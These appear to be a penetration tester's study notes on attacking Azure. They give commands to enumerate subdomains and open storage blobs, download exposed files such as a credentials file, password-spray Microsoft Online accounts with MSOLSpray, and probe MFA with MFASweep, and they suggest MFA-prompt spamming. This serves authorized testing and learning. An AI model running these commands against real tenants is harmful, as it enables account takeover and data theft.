z- Get all public IP addresses for subscription
	- Azure CLI
		- `az network public-ip list --query '[].[name, ipAddress, publicIpAllocationMethod]' -o table`
	- Az Pwsh
		- `Get-AzPublicIpAddress | Select Name,IpAddress,PublicIpAllocationMethod`

- Anonymously enumerating services for a target
	1. Determine base-word search terms to work with. This will usually be linked with the name of the Azure customer that you are engaged with or known terms that are associated with the organization; for example, packt, azurepentesting, azurept, and so on
	2. Create permutations on the base words to identify potential subdomain names; for example, packt-prod, packt-dev, azurepentesting-stage, azurept-qa, and so on.
		- The Microsoft Azure resource naming best practices have been published at https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-bestpractices/resource-naming (you can also use this shortened URL: http://bit.ly/azurenamingbestpractices).
	3.  Enumerate subdomains that match these permutations using a tool such as MicroBurst, Gobuster, or DNSscan.
		- MicroBurst is best because it is Azure-specific
		- `Invoke-EnumerateAzureSubDomains -Base azurepentesting`

- Determine whether custom domains are hosted in Azure
	- `nslookup <domain>`
		- Note IP address
	- `Invoke-WebRequest https://cloudipchecker.azurewebsites.net/api/servicetags/manual?ip=<IP_ADDRESS> -UseBasicParsing | Select-Object -ExpandProperty Content`

- Identifying misconfigured blobs
	- Enumerate storage account containers with default permutation list
		- `Invoke-EnumerateAzureBlobs -Base <basestring>`
		- Can specity custom container name list in text file
			- `Invoke-EnumerateAzureBlobs -Base azurepentesting -Folders .\customcontainer.txt`
	- Download containers with weak permissions
		- `Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/public/README.txt" -OutFile "README.txt"`
		- `Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/private/credentials.txt" -OutFile "credentials.txt"`

- Spray Microsoft Online accounts
	- Generate text file containing user principal names (format: \<username\>@\<domain\>.com, eg. al@cthulhupentest.com)
	- Spray using MSOLSpray
		- `Invoke-MSOLSpray -UserList .\userlist.txt -Password myPassword123`
		- Note the script also is able to tell if MFA is enabled for each user

- If credentials are restricted by Conditional Access policies or MFA:
	- Look for bypass with MFASweep
		- `Invoke-MFASweep -Username sandra@azurepentesting.com -Password myPassword123`
	- Social engineering or simply spamming the user with MFA requests may work
		- It worked against Uber...